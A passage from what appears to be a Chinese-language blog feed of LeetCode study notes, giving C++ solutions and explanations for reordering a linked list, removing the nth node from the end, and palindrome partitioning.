        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/143/question1.jpeg"></p><p><img src="/img/LeetCode/143/question2.jpeg"></p><ul><li>題目難度: <code>Medium</code></li><li>題目敘述: 題目給定一個 single linked list，<code>L0 → L1 → … → Ln - 1 → Ln</code> 請將這個 list 重組成 <code>L0 → Ln → L1 → Ln - 1 → L2 → Ln - 2 → …</code> 在這當中請不要改動節點值。</li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p><img src="/img/LeetCode/143/algo1.png"></p><p>由於排序看起來像是把一個 linked list 頭尾對折然後再交互連接，<strong>因此我的想法會是先找到鏈結的中間節點，再將其拆分成兩個 list，之後將後半部分的 list 進行反序排列，接著再跟前半部分的list交互排列。</strong></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">        ListNode *prev = <span class="literal">NULL</span>;</span><br><span class="line">        ListNode *cur = head;</span><br><span class="line">        <span class="keyword">while</span>( cur != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode* nextTemp = cur-&gt;next;</span><br><span class="line">            cur-&gt;next = prev;</span><br><span class="line">            prev =cur;</span><br><span class="line">            cur = nextTemp;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> prev;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">reorderList</span><span class="params">(ListNode* head)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (!head || !head-&gt;next) <span class="keyword">return</span>;</span><br><span class="line">        ListNode *ptr1 = head;</span><br><span class="line">        ListNode *ptr2 = head;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Find the middle node  of the list</span></span><br><span class="line">        <span class="keyword">while</span>( ptr2-&gt;next!= <span class="literal">nullptr</span>  &amp;&amp; ptr2-&gt;next-&gt;next !=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ptr1 = ptr1-&gt;next;</span><br><span class="line">            ptr2 = ptr2-&gt;next-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// Now the ptr2 point to the end of the list, and the ptr1 point to the middle node</span></span><br><span class="line">        <span class="comment">// Reverse the second half of the list</span></span><br><span class="line"></span><br><span class="line">        ptr2 = <span class="built_in">reverseList</span>(ptr1-&gt;next);</span><br><span class="line">        ptr1-&gt;next =  <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">        ptr1=head;</span><br><span class="line">        <span class="keyword">while</span>(ptr2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ListNode *nextPtr = ptr1-&gt;next;</span><br><span class="line">            ListNode *nextPtr2 = ptr2-&gt;next;</span><br><span class="line">            </span><br><span class="line">            ptr1-&gt;next =  ptr2;</span><br><span class="line">            ptr1 = nextPtr;</span><br><span class="line">            ptr2-&gt;next =  ptr1;</span><br><span class="line">            ptr2 = nextPtr2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡透過兩個函數來進行實踐， <code>reorderList</code> 以及 <code>reverseList</code>，首先在 <code>reorderList</code> 的部分，要先找到中間節點，這裡是採用 <strong>Two-Pointer</strong> 的作法，也就是讓兩個指標走的速度不一樣，指標 <code>ptr1</code> 一次走一個，而 <code>ptr2</code> 一次走兩個，當 <code>ptr2</code> 走到最後一個節點的時候，<code>ptr1</code> 會剛好找到中間的節點。</p><p><strong>這時中間節點的下一個節點就會是後半部鏈結的頭</strong>，就直接將他丟到 <code>reverseList</code> 函數中，並將回傳結果更新為 <code>ptr2</code></p><p><em>reverseList</em> 這裡挺基本的，就是透過兩個指標，一個指向前一個節點，另一個指向當前節點，另外宣告一個暫存下一個位址的指標(當前的<code>next</code>)，接著，**當前節點的下一個節點，由於要反序鏈結，所以要指向前一個節點 (<code>prev</code>)**，而這時 <code>prev</code> 的任務就完成了，將其指向到當前節點的位置 (<code>cur</code>)，接著要更新當前節點，讓他繼續往下走，所以讓他指向 <code>nextTemp</code>，最後在跳出迴圈時，<code>cur</code> 會指向 <code>NULL</code> 而 <code>prev</code> 會指向最後一個節點的位址，而現在他會是反序鏈結的頭</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ListNode* <span class="title">reverseList</span><span class="params">(ListNode *head)</span></span>&#123;</span><br><span class="line">  ListNode *prev = <span class="literal">NULL</span>;</span><br><span class="line">  ListNode *cur = head;</span><br><span class="line">  <span class="keyword">while</span>( cur != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">      ListNode* nextTemp = cur-&gt;next;</span><br><span class="line">      cur-&gt;next = prev;</span><br><span class="line">      prev =cur;</span><br><span class="line">      cur = nextTemp;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> prev;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/img/LeetCode/143/reverse.png"></p><p>我們回到 <code>reorderList</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ptr1-&gt;next =  <span class="literal">nullptr</span>;</span><br><span class="line"></span><br><span class="line">ptr1=head;</span><br><span class="line"><span class="keyword">while</span>(ptr2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">    ListNode *nextPtr = ptr1-&gt;next;</span><br><span class="line">    ListNode *nextPtr2 = ptr2-&gt;next;</span><br><span class="line">    </span><br><span class="line">    ptr1-&gt;next =  ptr2;</span><br><span class="line">    ptr1 = nextPtr;</span><br><span class="line">    ptr2-&gt;next =  ptr1;</span><br><span class="line">    ptr2 = nextPtr2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接著要將兩個鏈結切乾淨，因此將原先在前鏈結中間節點接到 <code>NULL</code>，並 <code>ptr1</code> 指回原本的 <code>head</code>，這時就可以來交互排列了，這裡需要兩個額外的指標來保存原先個別節點的下一個位址</p><p>接著就是從 <code>ptr1</code> 的下一個節點指向給 <code>ptr2</code>， <code>ptr1</code> 移動到它原先的下個節點 <code>nextPtr</code><br>而 <code>ptr2</code> 指向給 <code>ptr1</code> 原先的下一個節點， <code>ptr2</code> 移動到它原先的下個節點 <code>nextPtr2</code></p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(ptr2 != <span class="literal">nullptr</span>)&#123;</span><br><span class="line">    ListNode *nextPtr = ptr1-&gt;next;</span><br><span class="line">    ListNode *nextPtr2 = ptr2-&gt;next;</span><br><span class="line">    </span><br><span class="line">    ptr1-&gt;next =  ptr2;</span><br><span class="line">    ptr1 = nextPtr;</span><br><span class="line">    ptr2-&gt;next =  ptr1;</span><br><span class="line">    ptr2 = nextPtr2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這樣就能夠成功排序。</p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/143/result.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><ul><li>找中間節點: $O(n&#x2F;2)$，$n$ 為節點數量</li><li>反轉鏈表後半部分: $O(n&#x2F;2)$，$n$ 為節點數量</li><li>合併兩個鏈表: $O(n)$</li></ul><p>因此整體時間複雜度為 $O(n)$</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p>$O(1)$，額外使用的指標變數僅占用常數規模的空間複雜度。</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>刪除從鏈結末端第N個節點 | Medium | LeetCode#19. Remove Nth Node From End of List</title>
      <link href="/posts/a0e0ab51.html"/>
      <url>/posts/a0e0ab51.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/19/question.jpeg"></p><ul><li><p>題目難度：<code>Medium</code></p></li><li><p>題目敘述： 給定一個 Linked List 的 <code>head</code>，移除從尾端數來第 <code>n</code> 個節點，並返回list</p></li></ul><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>最直覺的做法就是，先取得 list 長度，再用長度扣掉 <code>n</code> 得到的數字假設是 <code>m</code>，就要被刪除的就是從首端往後數的第 <code>m</code> 個節點。 刪除節點這部分也很基本，那就是透過一個 pointer 指向要被刪除節點指向的下一個節點位址，在讓待刪除節點的前一個節點指向這個 pointer，最後返回 <code>head</code></p><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) </span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(head == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">if</span>(head-&gt;next == <span class="literal">nullptr</span>) <span class="keyword">return</span> <span class="literal">nullptr</span>;</span><br><span class="line">        ListNode *ptr=head;</span><br><span class="line">        ListNode *prev=ptr;</span><br><span class="line">        ListNode *temp = <span class="literal">nullptr</span>;</span><br><span class="line">        <span class="type">int</span> count = <span class="number">1</span>;</span><br><span class="line">        <span class="type">int</span> len=<span class="number">1</span>;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span>(ptr!=<span class="literal">nullptr</span> &amp;&amp; ptr-&gt;next!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">            len++;</span><br><span class="line">        &#125;</span><br><span class="line">        cout &lt;&lt; len &lt;&lt; endl;</span><br><span class="line">        ptr=head;</span><br><span class="line">        <span class="type">int</span> m = len-n+<span class="number">1</span>;</span><br><span class="line">        <span class="comment">// delete head</span></span><br><span class="line">        <span class="keyword">if</span>(m==<span class="number">1</span>)&#123;</span><br><span class="line">            head = ptr-&gt;next;</span><br><span class="line">            <span class="keyword">return</span> head;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span>(ptr!=<span class="literal">nullptr</span> &amp;&amp; count&lt;m)&#123;</span><br><span class="line">            prev = ptr;</span><br><span class="line">            ptr = ptr-&gt;next;</span><br><span class="line">            count++;</span><br><span class="line">        &#125;</span><br><span class="line">        temp = ptr-&gt;next;</span><br><span class="line">        prev-&gt;next = temp;</span><br><span class="line">        ptr=<span class="literal">nullptr</span>;</span><br><span class="line">        <span class="keyword">delete</span> ptr;</span><br><span class="line">        <span class="keyword">return</span> head;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>那實際寫code，還是有少考慮到一些 edge case，像是如果要刪除的節點本身就是 <code>head</code>，這樣就需要將最終回傳的 <code>head</code> 指定為當前 <code>head</code> 的下一個節點，另外就是若只是一個節點的List，那就直接回傳 <code>NULL</code> 即可。其他部分做法就跟剛剛提的一樣。首先讓 <code>ptr</code> 指標走完整個 list，並記錄長度。之後再將 ptr指回 <code>head</code>。另外這裡也透過一個變數 <code>m</code> 來看從 <code>head</code> 到底要走多少步。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span>(ptr!=<span class="literal">nullptr</span> &amp;&amp; count&lt;m)&#123;</span><br><span class="line">    prev = ptr;</span><br><span class="line">    ptr = ptr-&gt;next;</span><br><span class="line">    count++;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>這段代表讓指標移動到我們要刪除的位置，迴圈跑完後 <code>prev</code> 會移動到刪除節點的前一個節點位置，<code>ptr</code> 會待向帶刪除節點，這裡其實可以將 <code>prev-&gt;next</code> 直接指向 <code>ptr-&gt;next</code> 就不需要額外的 <code>temp</code> 接著將 <code>ptr</code> 指向 <code>nullptr</code> 並且刪除指標。最後回傳 <code>head</code> </p><h3 id="執行結果"><a href="#執行結果" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/19/result.jpeg"></p><h2 id="其他做法"><a href="#其他做法" class="headerlink" title="其他做法"></a>其他做法</h2><p>其他做法處理 edge case 的方式我覺得很值得參考：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">dummy-&gt;next = head;</span><br><span class="line"></span><br><span class="line">....</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> dummy-&gt;next;</span><br></pre></td></tr></table></figure><p>透過一個新的節點，可以保證都會指導鏈結頭部，最後只要回傳 dummy node 的 <code>next</code> 就好</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Definition for singly-linked list.</span></span><br><span class="line"><span class="comment"> * struct ListNode &#123;</span></span><br><span class="line"><span class="comment"> *     int val;</span></span><br><span class="line"><span class="comment"> *     ListNode *next;</span></span><br><span class="line"><span class="comment"> *     ListNode() : val(0), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x) : val(x), next(nullptr) &#123;&#125;</span></span><br><span class="line"><span class="comment"> *     ListNode(int x, ListNode *next) : val(x), next(next) &#123;&#125;</span></span><br><span class="line"><span class="comment"> * &#125;;</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    <span class="function">ListNode* <span class="title">removeNthFromEnd</span><span class="params">(ListNode* head, <span class="type">int</span> n)</span></span>&#123;</span><br><span class="line">        ListNode *dummy = <span class="keyword">new</span> <span class="built_in">ListNode</span>(<span class="number">0</span>);</span><br><span class="line">        dummy-&gt;next = head;</span><br><span class="line">        ListNode *ptr=dummy;</span><br><span class="line">        ListNode *prev=dummy;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=<span class="number">0</span>; i&lt;=n; ++i)&#123;</span><br><span class="line">            ptr=ptr-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>(ptr!=<span class="literal">nullptr</span>)&#123;</span><br><span class="line">            ptr=ptr-&gt;next;</span><br><span class="line">            prev=prev-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ListNode* temp = prev-&gt;next;</span><br><span class="line">        prev-&gt;next = prev-&gt;next-&gt;next;</span><br><span class="line">        <span class="keyword">delete</span> temp;</span><br><span class="line"></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> dummy-&gt;next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="執行結果-1"><a href="#執行結果-1" class="headerlink" title="執行結果"></a>執行結果</h3><p><img src="/img/LeetCode/19/result2.jpeg"></p><h1 id="複雜度"><a href="#複雜度" class="headerlink" title="複雜度"></a>複雜度</h1><h2 id="時間複雜度"><a href="#時間複雜度" class="headerlink" title="時間複雜度"></a>時間複雜度</h2><p><em>我原本的程式</em><br>$O(L)$: 計算長度時需要遍歷 $L$ 個節點，找到待刪除節點最壞狀況也會遍歷 $N$ 個節點，因此會是 $O(N)+O(N) &#x3D; O(N)$ </p><p><em>新的做法</em><br>$O(L)$: 前半迴圈走了 $N+1$ 步，後半迴圈執行了 $L-N$ 次，因此執行時間複雜度為 $O(L)$, $L$ 為鏈結長度</p><h2 id="空間複雜度"><a href="#空間複雜度" class="headerlink" title="空間複雜度"></a>空間複雜度</h2><p><em>我原本的程式</em></p><p>$O(1)$: 宣告指標，常數級別儲存</p><p><em>新的做法</em></p><p>$O(1)$: 宣告指標跟空節點，常數級別儲存</p>]]></content>
      
      
      <categories>
          
          <category> LeetCode筆記 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> LeetCode </tag>
            
            <tag> C++ </tag>
            
            <tag> Medium </tag>
            
            <tag> Linked List </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>回文分割 | Medium | LeetCode#131. Palindrome Partitioning</title>
      <link href="/posts/a97a6fae.html"/>
      <url>/posts/a97a6fae.html</url>
      
        <content type="html"><![CDATA[<h1 id="題目敘述"><a href="#題目敘述" class="headerlink" title="題目敘述"></a>題目敘述</h1><p><img src="/img/LeetCode/131/question.jpeg"></p><ul><li>題目難度： <code>Medium</code></li><li>題目敘述：給定字串 <code>s</code>，分割字串使其所有子字串都是 <strong>回文(Palindrome)</strong> ，並回傳所有可能的分割結果</li></ul><div class="note info flat"><p>回文(Palindrome) 代表字串從左往右讀的結果跟從右往左讀的結果一樣。</p></div><h1 id="解法"><a href="#解法" class="headerlink" title="解法"></a>解法</h1><h2 id="一開始的想法"><a href="#一開始的想法" class="headerlink" title="一開始的想法"></a>一開始的想法</h2><p>這題的想法一樣會是 backtracking，主要會需要去分割每個字串，<strong>意思是將不同字串組合加入到某個字串變數中，接著需要檢查該字串組合是否是回文，如果不是，那就繼續嘗試其他字串組合，如果是回文，那就將該字串組合添加到子陣列中</strong>，並且進入下一層遞迴。  遞迴終止條件就是當前遞迴深度已經達到題目給的字串長度</p><blockquote><p>到目前爲止的想法都蠻正確的，但這次主要會是在字串分割還有字串反轉，我其實還沒刷對應題目，因此要怎麼樣在Leetcode 中快速做到，是這題中學習的</p></blockquote><h2 id="我的解法"><a href="#我的解法" class="headerlink" title="我的解法"></a>我的解法</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Solution</span> &#123;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; result;</span><br><span class="line">    <span class="function"><span class="type">bool</span> <span class="title">checkPalindrome</span><span class="params">(string str)</span></span>&#123;</span><br><span class="line">        string reverseStr = str;</span><br><span class="line">        <span class="built_in">reverse</span>(reverseStr.<span class="built_in">begin</span>(), reverseStr.<span class="built_in">end</span>());</span><br><span class="line">        <span class="keyword">return</span> str == reverseStr;   </span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="type">void</span> <span class="title">partitionhelper</span><span class="params">(string s, vector&lt;string&gt; subList, <span class="type">int</span> depth)</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(depth== s.<span class="built_in">length</span>())&#123;</span><br><span class="line">            result.<span class="built_in">push_back</span>(subList);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span>(<span class="type">int</span> i=depth; i&lt;s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">            string cur = s.<span class="built_in">substr</span>(depth, i-depth+<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="built_in">checkPalindrome</span>(cur))&#123;</span><br><span class="line">                subList.<span class="built_in">push_back</span>(cur);</span><br><span class="line">                <span class="built_in">partitionhelper</span>(s, subList, i+<span class="number">1</span>);</span><br><span class="line">                subList.<span class="built_in">pop_back</span>();</span><br><span class="line">            &#125; </span><br><span class="line">            cur = <span class="string">&quot;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    vector&lt;vector&lt;string&gt;&gt; <span class="built_in">partition</span>(string s)&#123;</span><br><span class="line">        <span class="keyword">if</span>(s==<span class="string">&quot;&quot;</span>) <span class="keyword">return</span> result;</span><br><span class="line">        vector&lt;string&gt; sub;</span><br><span class="line">        string temp_cur;</span><br><span class="line">        <span class="built_in">partitionhelper</span>(s,sub, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>這裡一共定義了三個 function，分別為 <code>partition</code>, <code>partitionhelper</code>, <code>checkPalindrome</code>，首先介紹 <code>partitionhelper</code>:</p><p>參數說明：</p><ul><li><code>string s</code>: 用於傳遞原始字串</li><li><code>vector&lt;string&gt; subList</code>: 用於傳遞回傳陣列中的子陣列</li><li><code>int depth</code>: 記錄當前遞迴樹的深度</li></ul><p><em>遞迴終止條件</em><br>首先遞迴終止條件會適當當前遞迴深度等同於字串長度，也就代表已經嘗試出其中一種組合了。</p><p><em>每一層的判斷</em><br>接著在每一層的判斷，要去分割出字串來嘗試組合。 這裡的 <code>for</code> 迴圈的初始值代表從字串分割處開始到字串結尾，進行各種可能的字串分割</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">for</span>(<span class="type">int</span> i=depth; i&lt;s.<span class="built_in">length</span>(); i++)&#123;</span><br><span class="line">    string cur = s.<span class="built_in">substr</span>(depth, i-depth+<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="built_in">checkPalindrome</span>(cur))&#123;</span><br><span class="line">        subList.<span class="built_in">push_back</span>(cur);</span><br><span class="line">        <span class="built_in">partitionhelper</span>(s, subList, i+<span class="number">1</span>);</span><br><span class="line">        subList.<span class="built_in">pop_back</span>();</span><br><span class="line">    &#125; </span><br><span class="line">    cur = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>**其中 <code>substr</code> 為 <code>std::string</code> 當中的函數，可以用於切割字串，需要給定切割範圍，這裡的切割範圍指定為從 <code>depth</code> 切到 <code>i-depth+1</code>**，這個範圍能夠讓每次切割時，都從上一個切割處開始，並且從切個處的下一個位置依序嘗試組合到字串尾端，可以看下面的圖片來理解。</p><p><img src="/img/LeetCode/131/string_parti.png"></p><p>當然我們在嘗試完組合後還需要透過一個函數來確認當前組合是否有回文存在，<strong>這裡主要是透過 <code>std::string</code> 中的 <code>reverse</code> 來去對原始字串進行調換</strong>，用法如下：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">string str = <span class="string">&quot;abc&quot;</span>;</span><br><span class="line"><span class="built_in">reverse</span>(str.<span class="built_in">begin</span>(), str.<span class="built_in">end</span>());</span><br><span class="line">cout &lt;&lt; str</span><br><span class="line"><span class="comment">// output: &quot;cba&quot;</span></span><br></pre></td></tr></table></figure><p>因此這個函數會先將傳入字串存放到一個暫時的字串變數 <code>reverseStr</code> 中，接著對變數中的字串進行reverse，最後回傳比較結果，看反序字串是否跟正序字串一樣。</p><figure class="highlight cpp"><table><tr><td 